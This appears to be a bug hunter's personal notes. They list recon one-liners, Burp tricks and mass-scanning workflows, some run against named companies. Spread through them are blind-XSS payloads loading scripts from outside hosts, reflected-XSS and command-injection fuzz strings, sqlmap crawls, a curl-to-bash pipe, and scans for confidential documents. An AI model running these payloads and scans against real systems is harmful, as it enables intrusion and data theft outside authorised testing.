
Adversarial Thinking for Bug Hunters
     “Make software work in ways it wasn’t intended or expected.”
     be curious and guess everything, plays with it, and read docs until you realize how it is working
              Security Risk → CWE → CAPEC → Testing Pattern = Attack
              
         allows know that you are an attacker, you breaks thinhgs, allows try and do something that will break the system, go against the system
         
         
         check list for evry wep app assesment 
         https://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md
         
         check
         https://x.com/i/bookmarks?post_id=1792844537225683386
         
         
         tip
         always check ckecklist and tip
         
         
         NOTE
         
              
              
              note   https://medium.com/@nanwinata/curiosity-part-2-with-5000-bounty-025536feced7
              there will always be changes in Shodan results, whether it’s new IPs, new domains, or new ports. Make it a daily routine to start bug bounty hunting, spending the first 1–2 hours repeating this process every day or every week is very reasonable
              
           
              
               steps to take inoder to understand application
               
               1)YouTube    check if there is a video explaination of the program on youtube
               2) Articles that explain how to use Target.
               3 Take notes for any information you have, and you can use the xmind program for this.
               4) Try to imagine scenarios that the malicious user could do in each explanation of a specific function, and take them in Notes and try to apply them in the end.
               5)  allwys ask alot of question on why there are they using any code and how to break it 
               
               
               
               tip tip tip
               NOTE
                 Match & Replace is a very underrated feature of Burp Suite. I think more people should try to employ it in their test flow. My favorite rules:
               https://portswigger.net/burp/documentation/desktop/testing-workflow/access-controls/using-match-and-replace
                   note, match and replace 302 to stop redirecting in burp settings, match 302 replace 200 and stop redircting
               When checking for any vunerability issues usually IDORS, AUTHTICATION, SQL , Check if you could use burp match and replace
               example
               test > test’
✅ Simply replace false with true. This usually helps to unlock many hidden features of targeted web apps. Note in some cases it could also break the app, so be cautious here.
✅ Header manipulation. Sometimes it's a good idea to experiment with Referer, Origin, and X-Forwarded-For headers to bypass some weird WAF restrictions. I like to use localhost, or 127.0.0.1 as a value for these headers.
✅ Replacing session tokens. This one is good for testing IDORs. Alternatively, you could use the autorepeater plugin.
✅ HTTP parameter values. Sometimes after testing for a while, you could find some parameters like userRole. You could try different values, like changing from user to admin, etc.

   8 THINGS TO MATCH AND REPLACE  
   1. Attack vector/threat model validation: 
When fuzzing, try match and replacing a place holder for your payload to quickly verify if an attack path is viable before fully developing it.

 2) Feature flags / Experiments / A/B Testing: 
Check for feature flags in SaaS or actively developed apps. Enabling hidden features can significantly expand your attack surface.

3) 3. Creating dynamic fuzzing wordlist: 
Use placeholders like {domain}, {email}, {ip} in fuzz lists. Replace these dynamically to streamline payload customization across different targets.

4. Client-side enforced RBAC: 
Identify the front-end's source of truth (e.g., /user API). Look for exploitable parameters like isPaid or isSub to bypass paywalls or client-side RBAC controls.

5. Storing payloads in match and replace: 
If you have a massive app, or if you’re spraying the same payload in lots of inputs, having a placeholder such as xsspayload which replaces your XSS payload can be a nice timesaver.

6. Header replacements: This one is quite a far-reaching one as headers can be used to enforce or determine a lot of things. Some common ones include:

7. X-Forwarded-For: 127.0.0.1 : 
Commonly used by proxies to differentiate the origin host of a request but can be passed from the client side to the backend directly if the proxy isn’t configured properly.
  8. Replacing part of JS files: 
To debug minified JS, disable source maps to prevent breakpoint issues. This ensures stable debugging but requires working with minified code.             
              
              

              A quick one-liner to get most of the wildcard domains of BBPs: 
curl -s https://raw\.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r
              
              
        
              
              
          
              best resources to find origin IPs

 shodan.io 🡺 Ssl.cert.subject.CN:"domain/subdomain"
 en.fofa.info 🡺 normal search for domain/subdomain
 search.censys.io 🡺 normal search for domain/subdomain
 securitytrails.com  normal search for domain/subdomain
              
          USING    AXIOM AND RECOON BY OTHERLY
          axiom-fleet -i 20 
          for i in {1..20}; do echo "apple.com" >> target.txt; done
          axiom-scan target.txt -m update-resolver
          axiom-scan 2m-subdomain.txt -m split-worldlist
          axiom-scan target.txt -m puredns-bruteforce -anew apple.com   
          
          
           RECON NOTE 
           axiom
           
           
            axiom-init
               axiom-fleet 'worldpay' -l 15
               $ cd ~/.axiom/modules/  
                gedit  ~/.axiom/modules/amass.json    or gedit  ~/.axiom/modules/subfinder.json      to edit
                axiom-scan worldpay-domains -m amass -anew amass.txt
                axiom-scan worldpay-domains -m subfinder -anew subfinder.txt
                axiom-scan worldpay-domains -m gau -anew gau.txt
                cat amass.txt subfinder.txt | sort -u > hostnames.txt
                axiom-scan hostnames.txt -m dnsx -anew dnsx.txt
                
                
                use of shadon  // awesome shodan,     check censys 
                   check the company certificate in browers keylock
                       ssl.cert.subject.CN:"worldpay.com" 200
                       ssl.cert.subject.CN:"worldpay" 200  -org:"amazon" -org:"akamai"
                       org: "worldpay" 200  
                 
                             google dork
                                 site:*.example.com inurl:login | inurl:signin Google

                       
                        org: "worldpay" port:443    //sometime filter out result by click more
                http.favicon.hash:HASH-http.title:"Title to exclude"      check fav-up github
             
                        
                        
                        
                       using uncover for shadan
                      i dont know why my uncover is not working  check on uncover
            uncover -silent  -s 'ssl.cert.subject.CN:"worldpay.com" 200 -http.title:"invalid URL" -http.title:"ERROR: The request could not be satisfied" 200' | sort -u | tee shodanIp.txt
            
            uncover -s 'ssl.cert.subject.CN:"worldpay" 200' -l 3000 -silent | sort -u | httpx -silent -mc 200 | tee uncovershodanip.txt
               cat shodanIP.txt | httpx -title -nc -sc -fr -silent -cname | anew httpx-ip.txt 
               
               using crt.sh
               https://crt.sh/?q=worldpay.com&output=json
               curl -s 'https://crt.sh/?q=worldpay.com&output=json' | jq '.[] | .common_name ' -r
               curl -s 'https://crt.sh/?q=worldpay.com&output=json' | jq '.[] | .common_name ' -r | sort -u
               
               ipinfo.io 
                 site:ipinfo.io "worldpay"
                      cat shodanIP.txt | grep 195.35.91   verify if inscope or duplicate
   
               
            

                 
                       axiom-scan dnsx.txt -m httpx -silent -sc -title -fr -anew httpsdnsx.txt
                axiom-scn gau.txt -m gau-pdf -anew gau-pdf.txt      check for gau-pdf moduled on myscreensht
                       axiom-scan hostnames.txt -m httpx -o httpx.txt
                       cat httpx.txt | grep 200 |grep admin
                       axiom-rm 'worldpay\*' -f    to delete axiom instances
     cat gau.txt | grep -oP '^https?://(?:[^/]*/){3}' | sort -u | tee root_dirs.txt     cleaning up gau file
     cat gau.txt | unfurl keys | awk '!seen[$0]++ {print "?" $0 "=FUZZ"}'    parameter gathering
         cat gau.txt | unfurl keys | sort -u  > parameter.txt
                       cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
                cat gau.txt | grep -Ei '\.pdf'  | httpx -mc 200 -silent -nc | tee gau-pdf.txt  
                 cat gau.txt | grep -Ei '\.doc'  | httpx -mc 200 -silent -nc | tee gau-doc.txt  
  cat gau.txt | grep -Ei '\.doc|\.docx' | wc -l #  | httpx -mc 200 -silent -nc | tee gau-docs.txt   
  cat gau.txt | grep -Ei '\.xls|\.xlsx'  | httpx -mc 200 -silent -nc | tee gau-xlss.txt 
  cat gau.txt | shodagrep -Ei '\.zip|\.gz|\.7z|\.tar|\.bz|\.gzip' | httpx -mc 200 -silent -nc | tee gau-compressed.txt 
  cat gau.txt | grep -Ei '\.php|\.asp|\.do|\.py|\.pl|\.jsp' | httpx -mc 200 -silent -nc | tee gau-backend.txt
   note** 
   you still used axiom-scan via nmap and other tools to scan
    cat gau.txt | grep -Ei 'login|register|signup|signin|sign-up|sign-in'| wc -l # | httpx -mc 200 -silent -nc | tee gau-login.txt 
    
     cat root_dirs.txt | grep -Ei 'login|register|signup|signin|sign-up|sign-in'| wc -l # | httpx -mc 200 -silent -nc | tee gau-login.txt 
     
     
     cat link.txt | grep -vE 'google'     this removes  google-link after using link-finder in browsers
     
      PORT SCANNING WITH OTHERLY
      bbscope bc -t <tooken > | tee bbscope.txt
      
      nmap -il hosts.txt -pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-port 22,80,443,53,5060,8080 --open -oG nmap.xml
      
      nmap script for finding script
      curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.sml
      
      
      write up
      curl -s 'https://crt.sh/?q=%22The+Coca-Cola+Company%22&output=json' | jq '.[] | .common_name' -r | sort -u
      
       bscope bc -b <TOKEN> | tee bbscope.txt
        then be sepertaed into two files, hosts.txt, and ips.tzt  and then run nmap
   nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,80,443,53,5060,8080 --open -oX nmap.xml
   
   curl -s 'https://gist.githubusercontent.com/ott3rly/7bd162b1f2de4dcf3d65de07a530a326/raw/83c68d246b857dcf04d88c2db9d54b4b8a4c885a/nmap-xml-to-httpx.sh' | bash -s - nmap.xml | httpx -mc 200
   
   blind xss
  1 using waymore for blind xss    check 
   
python3 waymore.py -i input.txt -mode U -oU waymore.txt -r 3

cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'feedback|support' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt

cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'login|register|auth|sign|account' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
  
  2
  Filtering  out link_finder file made from site:mil "feedback form" -pdf -doc -xls
  cat google.txt | grep -Ei '.mil' | httpx | tee google-filtered.txt
  
  

  Mass hunting leak filles
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt

Install pdftotext CLI utility on each axiom instance.
sudo apt-get install poppler-utils

Scanning  with axiom-modules
 
[{ 	"command":"for i in cat input | gau --subs --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", 	"ext":"txt" }]

~/.axiom/modules/gau-pdfs.json

You can turn on your creative thinking and try to modify this script to your own need. For example, using katana, instead of gau, or checking for other sensitive words, using other extensions and etc. Using own creative approach gives the most bounties!

axiom-scan targets-wildcards.txt -m gau-pdfs -anew pdf-leak-findings.txt


removing –subs flag: in gau-pdfs.json 


[{ 	"command":"for i in cat input | gau --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", 	"ext":"txt" }]

axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt

remember to Check for other documents other document types such as doc, docx, xlsx and etc


  
  Mass Scanning for xss     https://ott3rly.com/mass-cross-site-scripting-hunting/
chaos  -silent -d example.com | tee hostnames.txt
axiom-fleet xss-hunt -i 8
edit the httpx.json module located at ~/.axiom/modules/ a little bit to scan more ports
axiom-scan hostnames.txt -m httpx | tee alive.txt

cat alive.txt | grep -vE "blog|api" | grep 200 | awk '{print $1}' > alive_selected.txt

Collecting Endpoints
axiom-scan alive_selected.txt -m katana -duc -silent -nc -jc -kf -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | tee -a katana.txt
Using gau
suggest to use apex subdomains wordlist
axiom-scan targets-wildcards.txt -m gau | tee -a gau.txt
cat gau.txt katana.txt | grep -aiE '^http' | grep -aiE '\?' | qsreplace FUZZ > fuzzable_urls.txt

filtered out some specific keywords with gf

cat fuzzable_urls.txt | grep FUZZ | gf xss | grep -iavE 'pdf|txt|\?l=FUZZ$|\?contry=FUZZ$|\?q=FUZZ$|is/image' > filtered_fuzzable_urls.txt

Scanning Cross Site Scripting vulnerabilities
cat filtered_fuzzable_urls.txt | qsreplace "';a=prompt,a()//" > fuzz.tmp && axiom-scan fuzz.tmp -m freq | grep -v 'Not'

Check  this link for using  freq
https://github.com/takshal/freq
And 
https://ott3rly.com/axiom-module-part-4/ 

   s3 amazon hacking 
   ttps://ott3rly.com/misconfigured-s3-buckets-axiom-part-5/ 
   
   
     live hacking
     ffuf -u https://www.worldpay.com/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,302,301 -t 1000
     
     ffuf -u https://www.worldpay.com/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/common.txt
  
  uncover -s 'ssl.cert.subject.CN:"worldpay" 200' -l 3000 -silent | sort -u | httpx -silent -mc 200 | tee uncovershodanip.txt
  
  
  
  Param Mining

echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining  => {}" && arjun -u "{}" -m HEADERS'

echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining  => {}" && arjun -u "{}" -m POST'

  
    NOTE
      when caught a target with  xll or pdf. check fr exiftool github
      
      
      
      ONELINER FROM LIVE HACKING  AND LIVE RECON FROM OTHER3LY
  
      for i in x*; do sqlmap -m "$i" --random-agent --crawl=5 --forms --tamper=space2comment --batch --proxy=https://127.0.0.1:8080 & done       //note the file myuxt be in x and in the same directory
      
    echo 'url' | katana -u - -jc -nc -silent -f qurl -kf  -fx -retry 3 -d  5 -aff -ct  6m
   
   echo 'smart.com' | gau --subs | gf lfl | tee lfl.txt
   cat lfi-targets.txt |   nuclei -fr 0nh -silent -t ~/your template.lfl/yaml
   
      cat end-points |   nuclei -fr -nh -silent -t ~/your template.lfl/yaml -fr --proxy=http://127.0.0.1:8080 --dast
      cat end-points |   nuclei -fr -nh -silent -t ~/your template.  sql.yam -fr --proxy=http://127.0.0.1:8080 --dast
      
      
      
        sqlmap  -u  "smartkelvingsfc/display.action?id=*' --crawl=3 --forms --random-agent | tee sqlmap.yxy
        
      sqlmap  -u  "smartkelvingsfc/display.action?id=*' --batch --random-agent --technique=T | tee sqlmap.yxy
      
        sqlmap  -u  "smartkelvingsfc/display.action?id=*' --batch --random-agent | tee sqlmap.yxy
        
    
        
        ghaurl -u 'smart.com/spether/ajax.php' --batch
      
      for wordpress sites
      echo 'smart.com'  nuclie -tags wordpress
      
   
                       
             
                

              tip
              https://medium.com/@jeetpal2007/how-i-found-the-aws-credentials-and-other-api-keys-ccd1bb538d3b           //aws and api-key
              https://infosecwriteups.com/information-disclosure-story-of-500-400-bounty-97d3b343f9ad
        go to     https://otx.alienvault.com/indicator/domain/gap.com
        https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list?limit=100&page=1     or you can use the gau 
              
              
         ASSET DISCOVERY WEBSITES
         http://www.crunchbase.com/
         https://tracxn.com/a/dashboard
          crt.sh
         Whois data
         https://bgp.he.net/         Autonomous System Number (ASN) for Internet-routable IP  or  amass intel -org “<target>
         https://blog.projectdiscovery.io/asnmap/
         https://github.com/hakluke/hakrevdns
         SSL certificate
         Shodan
         https://securitytrails.com/
              
  tip by dana
  You got notified of a new in-scope live host 🤠 you visit it, and you come across this page(logiin page)... What's the first thing you try? 😎
  
  *** I’d recon the host. Check all ports and services. DNS enumeration. Cert analysis and check for additional subdomains via vhost discovery. Then I’d try to use the login form with admin:admin via BurpSuite to capture the full request/response and review all client side code. 
I’d try to cause a real error to get an idea of the tech stack in use, and use that to inform my wordlist choice so I could do a slow directory enumeration from a separate ephemeral IP in the background while I continue to try to figure out what this host does. 


understand the scope
if small, dont do subdomain analysis, move into appliction analysis 
#check for sharing authentication
complex issue    //login issues been overlooked 
sudo cp ~smartkelvin/go/bin/pdtm  /usr/local/bin  

  cool recon tip
  1 - Get the company IPs range X.X.X.X/24

2 - Run nmap -p 80,448,8080 IP/24 -oN file.txt 

3 - Use any IP extractor or API in case of automation or bash then save it on IPs.txt

4- run httpx -l IPs.txt -o final.txt

5 - run nuclei -l final.txt

—————————————————-

oneliner to get subdomains and related from the target itself

for h in $(cat hosts.txt); do curl -siL https://$h|egrep -io  "[0-9a-z_\-\.]+\.([0-9a-z_\-]+)?`echo $h|awk -F '.' '{print $(NF-1)}'`([0-9a-z_\-\.]+)?\.[a-z]{1,5}"|sort -fu ; done

read file; amass enum -o subdomains.txt -d $file; cat subdomains.txt | while read url; do python3 http://cc.py "$url" -y 18; cat *.txt |sed 's/\//\n/g' | sort -u  | grep -v 'svg\|.png\|.img\|.ttf\|http:\|:\|.eot\|woff\|ico\|bootstrap\|.jpg\|.jpeg' > list.txt

tip
Command Injection:
~Find Your subdomains 
~cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
~ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
~search for ”uid” in burp proxy intercept 

  Quick Tip: To find Directory listing with zero efforts, Gather all the subdomains using all the techniques and then run httpx with above flags [-title -sc] and see if you get some title as “ Index of / “ or “ Index of “, etc.



 $ chmod +x (tool)
how to use files everywhere
# mv (tool) /usr/local/bin
                                                   
   breif summary of my recon
   nmap
  find subdomain
  sort
  parameter
  hidden parameter
  js files 
  dorking google and github
  one linners
  source code look
  old bug resolved


   check reconftw    https://github.com/six2dez/reconftw
   
   
     tip
     In short:

Use simple censys search like (target.com) and services.software.product=jenkins

Or shodan querries like this: Set-Cookie: mongo-express=” “200 OK”
Add /jenkins/script to your wordlist.

Major Takeaways:

Never believe a 404 page.
Censys and Shodan are real friends.
   
     
                MY RECON SECTION                         MY RECON SECTION                       MY RECON SECTION
   for  large target   use this methodoloy                                          https://drive.google.com/file/d/1bALcKLEswahI8g-_65hggm6Q7395jRIQ/view?pli=1
   
   
                     Netlas.io 
     tip               https://an0nbil.medium.com/the-only-recon-methodology-you-need-cf6c3aff1af1
     https://app.netlas.io/certs/?q=certificate.subject.organizational_unit:"Org Name"&page=1&indices=
     https://app.netlas.io/certs/?q=certificate.subject.organization%3A%22Microsoft%20Corporation%22&page=1

     use this in reccon data flows 
     domain:/(.*\.)?domain\.[a-z0-9-]*/
   
   
   ./crt.sh -d apple.com | httpx -title -tech-detect -status-code | grep 200
                
         place all the target in burpdsite  
         https://whois.arin.net/ui/
                                 1
               subdomain enumeration
               amass, subfinder, assetfinder and sublister, findomain.   knockpy
               
                 using BBOT
               check   • https://github.com/blacklanternsecurity/bbot
               
               
               USING ./RECONFTW       https://github.com/six2dez/reconftw?tab=readme-ov-file
               
               ./reconftw.sh -d target.com -r
               ./reconftw.sh -l sites.txt -r -o /output/directory/
              
               
               amass
               nano $HOME/.config/amass/config.yaml            add your api keys on this file
               amass enum -active -df domains.txt -config $HOME/.config/amass/config.yaml -o amass_subdoamins.txt
               amass enum -asn 17012 -d paypal.com                                                                                                          discover more of your assets by specifying your ASN with Amass?
           amass intel -org "Tesla"         maybe for large scope and compaines
                   amass intel -active -asn 394161
          amass enum -asn -d tesla.com
          amass enum [-active] [-ip] -d target
       
        amass enum -d target.com -o /filepath/subdomains.txt
          amass enum [-active] [-ip] -d target.com
           amass enum -d target.com | grep target.com  # To just list subdomains
           
           amass enum -passive -d example.com -o results.txt

           
            tip
     Amass clean output using oam-tools.
     1    . Install oam-tools (https://shorturl.at/eowA4)
     2. Use Amass normally(amass enum -d target. com)
     3. Use oam to get clean results:
      oam_subs -names -d target .com
      
      check    github
      • https://github.com/blacklanternsecurity/bbot
              
                sublist3r
                pyhton sublist3r -d url -b optional
                • sublist3r -d example.com
                
                    knockpy
      knockpy -d domain.com --recon --bruteforce --save report
        
            assetfinder 
                        cat domains | assetfinder -subs-only
                        assetfinder -subs-only domain.com >> subdomains.txt
        
        
        FIND SUB-DOMAINS OF SUB-DOMAIN
        altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt                                                          https://github.com/infosec-au/altdns
        ./subbrute.py –t subdomains.txt
        check for altex
      
      
           
              crt
              
     curl -s https://crt.sh/\?q\=\domain.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >>subdomains.txt
           
                      
               
               subfinder 
               ~/.config/subfinder/provider-config.yaml     add  your api keys
               subfinder -d target.com -silent | httpx -silent -o urls.txt
                subfinder -d url - active | tee -a subfinder.txt
                subfinder -d google.com -all > subdomain.txt
             
            
                Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
                subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
                 subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
                
                If you have domains.txt file now you wanna check for admin panel the file
                 subfinder -d target[.]com -silent | sed 's/$/\/admin/' | httpx -title -status-code -content-length
                 Blind XSS In X-Forwarded-For Header
                 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"	
                 subfinder -d example.com --all --recursive > subdomain.txt                                                                         coffin
                       
                       
                       
              
             
        
                
                
               brute force subdomain
               knock.py 
               
               dns for subdomain
               dnsgen
               echo "url" |dnsgen | tee -a dns.text
               
               maual subdomain enum
               virustotal, censys,  choas
               
               Search Subdomain using Gospider
               gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
               
               NEW SUBDOMAINS FOR YOUR TARGET?
               curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.target.com/" test.txt | sed 's/ //g' && rm test.txt
               
               Simple tip for port scan 
1) after enumerat your subdomains save in  subs.txt
2) run this command 
"cat subs.txt | dnsx -a -ro | naabu -silent  -top-ports 1000 -exclude-ports 80,443,21,22,25 -o ports.txt"
    
    
              making subdomian permutaion and guess , if this is a large target  and then pass to httpx for live subdomin
              cat subfinder.txt | alterx | tee alterxsubfinder.txt
              subfinder -d tesla.com | alterx | dnsx
              echo gcash.com | alterx -pp 'word=subdomains-top1million-50000.txt' | dnsx 
              
                       tip
                 check        https://github.com/Tedixx/dmarc-subdomains/  for extra subdomain
                 
                 
                 maping IP/asn of a target
                  asnmap -a AS45596 -silent
                  asnmap -i 100.19.12.21 -silent
                 echo target.com | asnmap | naabu -p 443 | httpx | nuclei -id tech-detect
                 https://github.com/projectdiscovery/asnmap
                 echo AS54115 | asnmap | dnsx -ptr
                 echo AS54115 | asnmap | naabu -p 443
                   echo AS54115 | asnmap | naabu -p 443 | httpx 
                 
                 
                 using naabu
                 naabu -iL bbc.txt | tee bbcportscan.txt                              check open ports
                 
                 
                 
                 
                 
               
                 2
                 httpx and httprobe
                 
                 The options I like to use when getting alive subdomains:
cat domains.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -sc -cl -title -t 100 -fr -nc | anew alive.txt                                              cofin
subfinder -d example.com | httxpx-toolkit --silent | katana -ps -f qurl | gf xss | bxss --appendMode --payload "<script src=https://xss.report/c/coffinxp></script>" --parameters                                coffin
                 
                 
                FILTERING OUT LIVE SUBDOMIN  and DNS Resolution 
                 
               httpx -l all-subs.txt  -sc  -ip  -rl 10 -o alive_subs.txt in 
           cat subdomain.txt | httxpx-toolkit --ports 80,443,8080,8000,8888 --threads 200 > subdomains_alive.txt
               
            cat target.txt  |   htttpx -status-code -title -tech-detect -tls-grab -vhost -list 
                 
                 cat subdomains.txt | sort -u >> uniq_subs.txt         remove all duplicates subdomain
                 rm subdomains.txt && mv 1.txt subdomains.txt
                 cat  subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > alive.txt
                 httpx -l targets.txt -sc -location -title -server -td -ip -t 100 -o httpx.out

                 
                 # Check status of urls and make new file
                 
                  cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
                  cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
                 httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
                cat file.txt | httpx -sc
                cat uniq_subs.txt | httpx -o httpx
    
 
  
                  Httprobe 
            certspotter corp.yahoo.com | httprobe
            httprobe $ cat output.txt | httprobe | tee -a domains
             sort subdomain
             sort -u subdomains.txt | httprobe > /filepath/uniq.txt  
                 
                 
                 cat |grep -E *(url) | sot - u | urlsubdomain.txt
                  //note, when give a subdomian that is in scope , you have to move stright to extraction of url
                  
                  
                  /// cat subtxt sub2.txt sub3.txt | sort -u //
                  
                 port scanning
                 naabu --list alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabuports.txt
                  
                  
            3
               check for contetnt discovery
               dirb, gobuster,ffuf
               dirb https://example.com
               dirsearch -u https://example.com
               dirsearch -e php,html,js -u https://example.com -w /usr/share/wordlists/dirb/common.txt
               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt
               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt -fs 4517          //filter
           ffuf -u https://www.example.com/FUZZ -w wordlist/Seclists/Discovery/Web-content/raft-medium-files.txt -mc 200,302,301 -t 1000    or
           ffuf -c -u https://targe.com/FUZZ -w /root/Desktop/paths.txt -mc 200-299,300-302,403,500 -r -t 200
           
           
                                       coffin
           dirsearch -u https://example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http,tar.gz,sql,tar.gz,sql~,swp,tar,bz2,tar.bz2,tar.gz,txt,wadl,zip,log,xml,~js,.json

                cat list.txt | ffuf -w - -u https://target.com/FUZZ
                
                check if you could curl to get some get request from status 200 of ffuf
                https://medium.com/@red.whisperer/how-a-blackbox-target-turned-to-whitebox-with-recon-e46536672702
                curl https://rg.target.com/v2/admin-REDACTED/tags/list
                curl https://rg.target.com/v2/admin-REDACTED/manifests/1.10
               
               
                          4 
                 finding parameters / params discovery
                 arjun , paramspider ,gf  check github
                 
                
                 paramspider -l domains.txt       check its saving of fills  
                 paramspider -d example.com --proxy '127.0.0.1:8080'         web proxy to burp
                 
                 cat targets | xargs -n 1 -I {} python3 ~/ParamSpider/paramspider.py --subs False --domain {} --level high | urldedupe >> all-param.txt
                 
                 
        
                 arjun -u https://example[.]com - tweak with -m POST for method precision.
                 arjun -u https://www.example.com/file.php 
                 paramspider -l domains.txt -s
                 python3 paramspider[.]py -d example[.]com --level
                 gospider -S domains.txt -o gospider
                
                 
                 5
                 URL RECON - EXTRACTION  and find sensitive files 
                 gau, gospider, katana, gauplus
                 
               
                 
                    katana     check my katana docs down
                 $ cat in_scope.txt        
                login/
                 admin/
                 app/
                wordpress/
                 katana -u https://tesla.com -cs in_scope.txt
                 katana -u subdomains_alive.txt -d 5 -ps -rss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt                                   coffin
                 
                 gau
                 echo "url" |gau | tee gau.txt
                 
                 cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
                 cat gau.txt | grep -E '\.pdf' | sort -u | httpx -mc 200 | tee .gauPdf.txt        you could change the pdf to any file like xls,doc
                gau  -oP '^https?://(?:[^/]*/){2}' gau.txt | sort -u | httpx -mc 200 | tee gau.txt
      cat gau.txt | grep -Ei 'login|register|signup|signin|sign-in|sign-up|dashboard' | httpx -mc 200 > authendpoint.txt     //check sqli to login   
                
              
                
               cat gau.txt | grep ? | tee param.txt     /// filter out url
  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
  
      cat alive.txt | gau --o dirs.txt
      cat dirs.txt | grep "?" > params.txt 
      cat dirs.txt | grep ".js"$ > jsfiles.txt
                  
                  
                  
                 gospider    check for goSpider github
                    
               Gospider -s (url) --subs --js || tee gospider.txt
               gospider -S domains.txt -o gospider
               
               SINGLE TARGET
               gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
               
               MUITIPLE TARGET 
               gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
               
               GOSPIDER XSS
               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
               
               
              fillter files fron it
             cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
                 cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
                 
                 katana -list urls.txt -v -jc -o katana
                 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
                 
                    # Search for testing point with gau and fff
                  gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
                 sort -u urls.txt | fff -s 200 -o out/
                 

                    CHECK “FILES ” FOR DUPLICATES      CHECK “FILES ” FOR DUPLICATES        CHECK “FILES ” FOR DUPLICATES
                    cat file.txt | uro filteredparams.txt   
                    
                 
                 
                      
                     JAVASCRIPTS FILES
                     
                       discovering javascript files
        subfinder -d domain.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
